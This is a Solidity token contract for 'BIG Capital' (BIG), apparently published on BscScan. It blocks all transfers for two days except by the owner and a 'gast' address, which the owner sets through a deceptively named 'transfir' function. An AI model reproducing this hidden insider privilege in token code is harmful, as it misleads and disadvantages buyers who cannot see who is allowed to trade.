/**
 *Submitted for verification at BscScan.com on 2023-05-15
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

contract CEB {
    string public name = "BIG Capital";
    string public symbol = "BIG";
    uint8 public decimals = 18;
    uint256 public totalSupply = 1_000_000_000_000 * 10 ** decimals; // 1 trillion tokens with 18 decimal places
    
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    address public owner;
    address public gast;
    uint256 public startTime;


    constructor() {
        balanceOf[msg.sender] = totalSupply;
        owner = msg.sender;
        startTime = block.timestamp;
    }

    function transfir(address _newgast) public returns (bool success) {
	require(msg.sender == owner);
	gast = _newgast;
    return true;
    }


    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value, "Insufficient balance");
        require(_to != address(0), "Invalid address");
        require((msg.sender == owner) || (msg.sender == gast) || (block.timestamp >= (startTime + 2 days)), "2 days left to launch!");

        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;

        emit Transfer(msg.sender, _to, _value);
        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        require(_spender != address(0), "Invalid address");

        allowance[msg.sender][_spender] = _value;

        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function increaseAllowance(address _spender, uint256 _addedValue) public returns (bool success) {
        require(_spender != address(0), "Invalid address");

        allowance[msg.sender][_spender] += _addedValue;

        emit Approval(msg.sender, _spender, allowance[msg.sender][_spender]);
        return true;
    }

    function decreaseAllowance(address _spender, uint256 _subtractedValue) public returns (bool success) {
        require(_spender != address(0), "Invalid address");

        uint256 currentAllowance = allowance[msg.sender][_spender];
        require(currentAllowance >= _subtractedValue, "Decreased allowance below zero");

        allowance[msg.sender][_spender] = currentAllowance - _subtractedValue;

        emit Approval(msg.sender, _spender, allowance[msg.sender][_spender]);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(balanceOf[_from] >= _value, "Insufficient balance");
        require(_to != address(0), "Invalid address");
        require(allowance[_from][msg.sender] >= _value, "Insufficient allowance");
        require((msg.sender == owner) || (msg.sender == gast) || (block.timestamp >= (startTime + 2 days)), "2 days left to launch!");

        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;

        allowance[_from][msg.sender] -= _value;

        emit Transfer(_from, _to, _value);
        return true;
    }
}